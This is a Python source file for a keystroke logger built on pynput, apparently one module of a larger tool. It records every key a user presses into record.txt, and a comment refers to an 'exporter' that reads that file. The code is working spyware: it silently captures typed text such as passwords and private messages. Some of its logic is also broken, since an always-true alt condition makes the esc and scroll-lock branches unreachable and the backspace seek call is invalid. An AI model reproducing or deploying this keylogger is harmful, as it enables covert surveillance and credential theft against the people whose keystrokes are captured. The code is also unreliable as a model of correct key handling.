"""
Logger file. Started as a separate thread. Parses input from pynput and writes it to a .txt file
By Connor Jackson (BootSkiing)
"""
from pynput import keyboard

# Name of output file
output_file = "record.txt"


def on_press(key):
    """
    Pynputs calls this function whenever any key is pressed. Output file is opened for each character,
    and then closed so that there is less chance for exporter to hang on a file in use

    :param key:
    :return:
    """
    # Opens output file
    file1 = open(output_file, 'a')

    # Try/Except block to handle special keys (shift, alt, esc, etc.)
    try:
        print(key)
        file1.write(key.char)
        file1.close()

    except AttributeError:
        # Special keys are handled here
        print(key)
        if key == keyboard.Key.enter:
            file1.write('\n')
        elif key == '.':
            file1.write('.\n')
        elif key == keyboard.Key.space:
            file1.write(' ')
        elif key == keyboard.Key.backspace:
            # Backspace is in a try block because it will occasionally throw Exceptions
            try:
                file1.seek(-1)
                file1.truncate()
            except ValueError:
                # This happens if the first key pressed is backspace (on an empty file)
                pass
        elif key == keyboard.Key.alt or keyboard.Key.alt_gr or keyboard.Key.alt_l or keyboard.Key.alt_r:
            file1.write(' (alt) ')
        elif key == keyboard.Key.esc:
            file1.write(' (esc) ')
        elif key == keyboard.Key.scroll_lock:
            # Scroll lock is set to kill the process (Used mainly for testing/debugging purposes) (Plus no one uses it)
            file1.close()
            return False

    finally:
        # All elif's make sure to close the file after writing. This makes doubley sure that happens
        file1.close()


def on_release(key):
    """
    Pynputs calls this when a key is released. I don't really care about people holding keys, so the function isn't used

    :param key:
    :return:
    """
    pass


def listen():
    """
    "Main" function for logger. Starts the listener

    :return:
    """
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    # For running just the logger
    listen()
